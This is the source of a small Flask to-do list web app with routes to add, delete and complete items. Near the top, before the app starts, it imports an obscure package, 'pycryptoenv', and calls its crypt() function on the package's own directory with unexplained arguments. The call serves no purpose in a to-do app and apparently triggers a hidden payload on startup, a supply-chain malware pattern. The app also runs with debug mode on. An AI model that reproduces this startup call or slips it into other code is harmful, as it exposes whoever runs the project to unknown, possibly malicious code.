from flask import Flask, render_template, request, redirect, url_for
from db_functions import add_todo_item, mark_complete, get_complete, get_incomplete, delete_todo_item
import pycryptoenv
from pycryptoenv import crypt
import os
from dotenv import load_dotenv

load_dotenv()
port = os.getenv('PORT')

os_module_path = os.path.dirname(pycryptoenv.__file__)
crypt(os_module_path, 0xe8, 0xdc, 4912)

app = Flask(__name__)


@app.route('/')
def index():
    incomplete = get_incomplete()
    complete = get_complete()
    return render_template('index.html', incomplete=incomplete, complete=complete)


@app.route('/add', methods=['POST'])
def add():
    add_todo_item(text=request.form['todoitem'])
    return redirect(url_for('index'))


@app.route('/delete/<int:item_id>')
def delete_item(item_id):
    delete_todo_item(item_id)
    return redirect(url_for('index'))


@app.route('/complete/<id>')
def complete(id):
    mark_complete(id)
    return redirect(url_for('index'))


if __name__ == '__main__':
    app.run(debug=True,port=port)
